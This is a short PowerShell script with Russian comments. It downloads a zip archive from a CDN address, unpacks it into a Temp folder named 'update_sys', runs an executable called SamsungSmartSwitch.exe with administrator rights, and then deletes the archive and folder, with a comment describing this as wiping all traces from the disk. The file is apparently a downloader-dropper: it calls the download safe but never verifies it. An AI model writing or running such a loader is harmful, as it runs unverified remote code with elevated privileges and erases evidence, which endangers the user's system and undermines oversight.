$url = "https://jsdelivr.net"
$zipPath = "$env:LOCALAPPDATA\Temp\project.zip"
$destDir = "$env:LOCALAPPDATA\Temp\update_sys"

# Скачивание безопасного архива
Invoke-WebRequest -Uri $url -OutFile $zipPath

# Распаковка архива во временную папку
Expand-Archive -LiteralPath $zipPath -DestinationPath $destDir -Force

# Запуск распакованного файла от админа с ожиданием закрытия
Start-Process -FilePath "$destDir\SamsungSmartSwitch.exe" -Verb RunAs -Wait

# Полная зачистка всех следов с диска
Remove-Item -Path $zipPath -Force
Remove-Item -Path $destDir -Recurse -Force
